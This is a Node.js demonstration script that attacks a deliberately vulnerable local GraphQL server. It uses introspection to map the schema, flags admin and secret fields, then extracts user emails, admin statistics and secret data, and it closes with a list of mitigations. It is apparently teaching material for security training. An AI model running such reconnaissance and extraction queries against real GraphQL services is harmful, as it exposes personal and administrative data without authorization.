const fetch = require('node-fetch');

console.log('🚨 DEMONSTRATING GRAPHQL INTROSPECTION VULNERABILITY');
console.log('='.repeat(60));
console.log('');

// Step-by-step demonstration
async function demonstrateIntrospectionAttack() {
  const endpoint = 'http://localhost:4001/graphql';
  
  console.log('🎯 Target: Enhanced Vulnerable GraphQL Server');
  console.log(`📡 Endpoint: ${endpoint}`);
  console.log('');
  
  // Step 1: Basic introspection
  console.log('STEP 1: Basic Schema Discovery');
  console.log('-'.repeat(30));
  
  const basicQuery = `
    query BasicIntrospection {
      __schema {
        types {
          name
          kind
        }
      }
    }
  `;
  
  try {
    const response1 = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query: basicQuery })
    });
    
    const result1 = await response1.json();
    
    if (result1.data?.__schema) {
      const types = result1.data.__schema.types;
      console.log(`✅ Schema exposed! Found ${types.length} types:`);
      
      const customTypes = types.filter(t => 
        !t.name.startsWith('__') && 
        !['String', 'Int', 'Float', 'Boolean', 'ID'].includes(t.name)
      );
      
      customTypes.forEach(type => {
        console.log(`   📄 ${type.name} (${type.kind})`);
      });
      console.log('');
    }
  } catch (error) {
    console.log(`❌ Step 1 failed: ${error.message}`);
  }
  
  // Step 2: Detailed field discovery
  console.log('STEP 2: Discovering Sensitive Fields');
  console.log('-'.repeat(30));
  
  const detailedQuery = `
    query DetailedIntrospection {
      __schema {
        queryType {
          fields {
            name
            description
            type {
              name
              kind
            }
          }
        }
        mutationType {
          fields {
            name
            description
            type {
              name
              kind
            }
          }
        }
      }
    }
  `;
  
  try {
    const response2 = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query: detailedQuery })
    });
    
    const result2 = await response2.json();
    
    if (result2.data?.__schema) {
      console.log('🔍 EXPOSED QUERIES:');
      if (result2.data.__schema.queryType?.fields) {
        result2.data.__schema.queryType.fields.forEach(field => {
          const risk = ['admin', 'secret', 'user'].some(word => 
            field.name.toLowerCase().includes(word)
          ) ? '🚨' : '📝';
          console.log(`   ${risk} ${field.name}: ${field.type.name}`);
        });
      }
      
      console.log('');
      console.log('🔧 EXPOSED MUTATIONS:');
      if (result2.data.__schema.mutationType?.fields) {
        result2.data.__schema.mutationType.fields.forEach(field => {
          const risk = ['delete', 'admin'].some(word => 
            field.name.toLowerCase().includes(word)
          ) ? '🚨' : '📝';
          console.log(`   ${risk} ${field.name}: ${field.type.name}`);
        });
      }
      console.log('');
    }
  } catch (error) {
    console.log(`❌ Step 2 failed: ${error.message}`);
  }
  
  // Step 3: Actual data extraction
  console.log('STEP 3: Extracting Sensitive Data');
  console.log('-'.repeat(30));
  
  const dataQuery = `
    query SensitiveDataExtraction {
      users {
        id
        username
        email
        profile {
          firstName
          lastName
          bio
        }
      }
      adminStats {
        totalUsers
        totalPosts
        systemHealth
        secretMetrics
      }
      secretData
    }
  `;
  
  try {
    const response3 = await fetch(endpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ query: dataQuery })
    });
    
    const result3 = await response3.json();
    
    if (result3.data) {
      console.log('🚨 SENSITIVE DATA EXTRACTED:');
      console.log('');
      
      if (result3.data.users) {
        console.log('👥 User Data:');
        result3.data.users.forEach(user => {
          console.log(`   • ${user.username} (${user.email})`);
        });
        console.log('');
      }
      
      if (result3.data.adminStats) {
        console.log('📊 Admin Statistics:');
        const stats = result3.data.adminStats;
        console.log(`   • Total Users: ${stats.totalUsers}`);
        console.log(`   • Total Posts: ${stats.totalPosts}`);
        console.log(`   • System Health: ${stats.systemHealth}`);
        console.log(`   • Secret Metrics: ${stats.secretMetrics?.join(', ')}`);
        console.log('');
      }
      
      if (result3.data.secretData) {
        console.log('🔐 Secret Data:');
        console.log(`   • ${result3.data.secretData}`);
        console.log('');
      }
    }
  } catch (error) {
    console.log(`❌ Step 3 failed: ${error.message}`);
  }
  
  console.log('💀 ATTACK SUMMARY:');
  console.log('='.repeat(40));
  console.log('✅ Schema structure completely exposed');
  console.log('✅ Sensitive queries discovered');
  console.log('✅ Admin functionality identified');
  console.log('✅ Personal user data extracted');
  console.log('✅ System statistics accessed');
  console.log('✅ Secret information retrieved');
  console.log('');
  console.log('🛡️  MITIGATION:');
  console.log('   • Set introspection: false in production');
  console.log('   • Disable GraphQL Playground in production');
  console.log('   • Implement authentication & authorization');
  console.log('   • Use query depth limiting');
  console.log('   • Monitor for introspection attempts');
}

demonstrateIntrospectionAttack();